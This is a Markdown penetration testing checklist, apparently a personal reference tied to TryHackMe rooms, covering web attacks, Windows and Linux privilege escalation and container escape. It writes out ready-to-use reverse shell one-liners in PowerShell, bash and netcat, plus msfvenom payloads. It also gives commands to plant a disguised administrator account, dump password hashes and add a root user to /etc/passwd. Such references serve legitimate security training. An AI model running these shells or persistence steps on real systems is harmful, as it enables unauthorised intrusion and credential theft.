# Penetration Testing Checklist

---

## Web

- <https://github.com/riramar/Web-Attack-Cheat-Sheet>

- [ ] Nikto Scan
- [ ] HTML Analysis
  - [ ] HTML Comments
  - [ ] JavaScript
  - [ ] Network
- [ ] Stack
  - [ ] HTTP Headers
  - [ ] Favicon (<https://wiki.owasp.org/index.php/OWASP_favicon_database>)
  - [ ] Wappalyzer/BuiltWith
- [ ] Download HTTP directorys recursively
  - `wget -r -np -nH --cut-dirs=1 -R index.html http://hostname/aaa/`
- NMap Scans
  - [ ] Weak SSL ciphers
    - `nmap --script ssl-enum-ciphers -p 443 DOMAIN`
  - [ ] HTTP Methods
    - `nmap -p 443 --script http-methods`

### Enumeration

#### Hidden Pages

- [ ] Feroxbuster (feroxbuster --url $url:$port --wordlist $wl -x ext)
- [ ] robots.txt
- [ ] sitemap.xml
- [ ] OSINT
  - [ ] Google Dorks
  - [ ] Archive (web.archive.org)

#### Subdomains

- [ ] Certificate Search
- [ ] Sublist3r
- [ ] DNSRecon
- [ ] Virtual Hosts (ffuf -w $wl -H "Host: FUZZ.domain.tld" -u <http://ip> -fs {size})

### Exploitation

#### Login Page

- tryhackme.com/room/authenticationbypass
- [ ] Default Credentials
- [ ] Brute Force
  - [ ] Username Enumeration (ffuf -w $wl -X POST -d "username=FUZZ&password=x" -H $headers -u $url -mr "username already exists")
  - [ ] Email Enumeration (See Username Enumeration, change to password reset forms) *NOISY*
- [ ] Logic Flaws
- [ ] Cookie Tampering
- [ ] SQL Injection

#### File Inclusion

- tryhackme.com/room/fileinc
- [ ] Enumerate Parameters, POST Data, and Cookies
- [ ] Directory Traversal
- [ ] Local File Inclusion
- [ ] Remote File Inclusion
- [ ] Base64 Encode (php://filter/convert.base64-encode/resource=)

### Insecure Object Reference (IDOR)

- <https://tryhackme.com/room/idor>
- [ ] Check for IDs
- [ ] Encoded/Hashed IDs
- [ ] Unpredictable IDs (swap two account's IDs)

### Server-Side Request Forgery (SSRF)

- tryhackme.com/room/ssrfqi
- requestbin.com
- [ ] Filter Bypass
  - [ ] Deny List (Use alt localhost)
  - [ ] Allow List (Create malicious subdomain)
  - [ ] Open Redirect (Payload points to page which redirects to another website)
- [ ] Check Cloud IP (169.254.169.254)

### SQL Injection

- <https://tryhackme.com/room/sqlinjectionlm>
- [ ] SQLMap
- [ ] Error-based
- [ ] Union-based
- [ ] Blind SQLi
- [ ] Out-of-Band SQL

### Command Injection

- <https://tryhackme.com/room/oscommandinjection>
- [ ] Enumerate the programming language (PHP,Python,JS,etc.) or comand language (Bash,Bash,PowerShell,etc.)
- [ ] Blind CI
- [ ] Verbose CI

#### Cross-Site Scripting (XSS)

- [ ] Reflected XSS
- [ ] Stored XSS
- [ ] DOM Based XSS
- [ ] Blind XSS
  - TryHackMe 10.10.10.100
  - xsshunter.com

---

## Windows

- Shell Payloads
  - Powershell: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('$LOCALIP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
  - MSFVenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=$LOCALIP LPORT=$PORT`

### Windows Priv Esc

- Resources:
  - [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
  - [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
  - [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
  - [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
  - [Decoder's Blog](https://decoder.cloud/)
  - [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
  - [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

- [ ] Upgrade Shell
  - Run PS and bypass execution policy: `powershell.exe -nop -exec bypass`
- [ ] Windows Exploit Suggester - Next Generation (WES-NG)
  - [Script here](https://github.com/bitsadmin/wesng)
  - Update it: `wes.py --update`
  - Run `systeminfo > systeminfo.txt` on target machine
  - `wes.py systeminfo.txt`
- [ ] Metasploit Suggester (post/multi/recon/local_exploit_suggester)
- [ ] PowerUp
- [ ] winPEAS
  - [Script here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) `winpeas.bat > output-winpeas.txt`
- [ ] PrivescCheck
  - [Script here](https://github.com/itm4n/PrivescCheck)
  - `Set-ExecutionPolicy Bypass -Scope process -Force`
  - `. .\PrivescCheck.ps1`
  - `Invoke-PrivescCheck`
- [ ] Token Impersonation
- [ ] Account Creation
  - Add user: `net user DEFAULTUSER0 <password> /add`
  - Add user to administrators: `net localgroup administrators DEFAULTUSER0 /add`
  - We use the name DEFAULTUSER0 as it is a bultin account that is usually deleted.
  - If our account is found, defenders may just think it was not changed.
- [ ] User Enumeration
  - Get current user privilege: `whoami /priv`
  - List users, get info on a user: `net users` & `net user $USER`
  - List groups, get info on a group: `net localgroup` & `net localgroup $GROUP`
  - See other logged in users: `qwinsta` or `query session`
- [ ] View System Information
  - Get system information: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
  - Get patch information: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
  - Find string in files: `findstr /si $STRING *.txt`
  - View network connectins: `netstat -ano`
  - See scheduled tasks: `schtasks` & `schtasks /query /fo LIST /v`
  - View drivers: `driverquery`
  - Check antivirus: `sc query windefend` & `sc queryex type=service`
  - Find vulnerable software:
    - Applications: `wmic product get name,version,vendor`
    - Services: `wmic service list brief | findstr "Running"` & `sc qc $SERVICE`
- [ ] DLL Hijacking
  - Find an application with a missing DLL (ProcMon on test machine)
  - Create malicious DLL: `x86_64-w64-mingw32-gcc $CODE.x -shared -o $DLL.dll`
  - Restart the service (CMD): `sc stop $SERVICE & sc start $SERVICE`
- [ ] AlwaysInstallElevated
  - Check for both of these registry keys: `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` & `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
  - Generate an MSFVenom payload: `msfvenom -p $PAYLOAD LHOST=$IP LPORT=$LOCAL_PORT -f msi -o $SHELL.msi`
  - Install it: `msiexec /quiet /qn /i C:\Windows\Temp\$SHELL.msi`
- [ ] Saved Credentials
  - List saved credentials: `cmdkey /list`
  - Run shell with creds: `runas /savecred /user:$USER $SHELL`
- [ ] Registry Keys with Password
  - Search for keys: `reg query HKLM /f password /t REG_SZ /s` & `reg query HKCU /f password /t REG_SZ /s`
- [ ] Unattend Files
  - Unattend.xml files assist with Windows setup
  - They can hold sensative information based on the setup process
- [ ] Windows Services
  - **NOTE:** `sc` is aliased to `Set-Content` in Powershell, use `sc.exe` instead
  - [ ] Unquoted Service Path
    - Search for services with paths: `wmic service get name,displayname,pathname,startmode`
    - Ignore Windows operating system folders as we will not have permission for those
    - Check for write permissions for each spaced folder in the path
  - [ ] Insecure permisions on Service Executable
    - Find services with paths using `sc qc SERVICE` or `wmic` (see above)
    - Check executable permissions with `icacls PATH`
      - Vulnerable services will have modify (M) permissions for the user
    - Overwrite executable with malicious payload
      - Ensure user running the service has permissions for the new executable
      - `icacls PAYLOAD.exe /grant Everyone:F`
  - [ ] Insecure Service Permissions
    - Using [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals, check the services permissions `accesschk64.exe -qlc SERVICE`
      - If the service has the permissions SERVICE_ALL_ACCESS for the user, it is reconfigurable
    - Change the services executable path to a malicious payload
      - `sc config SERVICE binPath= "PAYLOAD.exe" obj= LocalSystem`
      - Again, ensure the service user had permissions for the executable (see above)
- [ ] Windows Privileges
  - [Complete list of  exploitable privileges](https://github.com/gtworek/Priv2Admin)
  - Check user privileges with `whoami /priv`
  - [ ] SeBackup / SeRestore
    - SeBackup and SeRestore allow the user to backup the SAM and SYSTEM password hashes for pass-the-hash and password cracking attacks.
    - `reg save hklm\(system/sam) PATH.hive`
  - [ ] SeTakeOwnership
    - SeTakeOwnership allows the user to take ownership of binaries and grant themselves permissions for that binary
    - `takeown /f BINARY.exe` to take over ownership
    - `icacls BINARY.exe /grant USER:F` to gain full permissions on the binary
- [ ] Vulnerable Software
  - `wmic product get name,version,vendor` lists software installed on the machine
    - `wmic` may not return ALL installed programs, depending on the installation processes. Check desktop shortcuts, services, and other traces of installed programs.
  - Search exploitdb and Google for potentially exploitable versions of installed software
    - `searchsploit SOFTWARENAMEANDVERSION`

---

## Linux

- Shell Payloads
  - Bash: `bash -i >& /dev/tcp/$LOCALIP/$PORT 0>&1`
  - NetCat (Rev): `mkfifo /tmp/f; nc $LOCALIP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
  - NetCat (Bind): `mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

### Linux Priv Esc

- [ ] Upgrade Shell
  - `python -c 'import pty; pty.spawn("/bin/bash")'`
- [ ] linPEAS
  - [ ] Sudo: `sudo -l` & gtfobins.github.io/#+sudo
  - [ ] SetUID: `find / -type f -perm -04000 -ls 2>/dev/null` & gtfobins.github.io/#+suid
  - [ ] Capabilities: `getcap -r / 2>/dev/null` & gtfobins.github.io/#+capabilities
  - [ ] Cron: `crontab -l` or `cat /etc/crontab`
  - [ ] PATH: Find SUID binary that runs an exe using PATH instead of direct reference
  - [ ] NFS: Find NFS with no_root_squash, mount and create SUID binary/shell
    - Find NFS: `cat /etc/exports | grep no_root_squash`
    - Find NFS on attacker machine: `kali$: showmount -e $IP`
- [ ] Metasploit Suggester (post/multi/recon/local_exploit_suggester)
- [ ] Brute Force Users
  - List users: `cat /etc/passwd | cut -d ":" -f 1`
  - List only users who have a /home directory: `cat /etc/passwd | grep home`
  - Brute force /etc/passwd & /etc/shadow: `unshadow passwd.txt shadow.txt > unshadowed.txt`
  - Crack them: `john --wordlist=$WL --format=sha512crypt unshadowed.txt`
- [ ] Add a root user account
  - Requires a exploit to edit /etc/passwd
  - Create a hashed passsword: `openssl passwd -1 -salt $SALT $PASS`
  - Append to /etc/passwd: `$USER:$HASHPASS:0:0:root:/root:/bin/bash` & `su $USER`

### Container Escape

- [ ] Check linPEAS for containers
- [ ] Auto-Escape with CDK (github.com/cdk-team/CDK)
- [ ] Check for Scripts being ran from host

## Reversing

TODO: Add section on reversing binaries

- [ ] strace, ltrace, ptrace
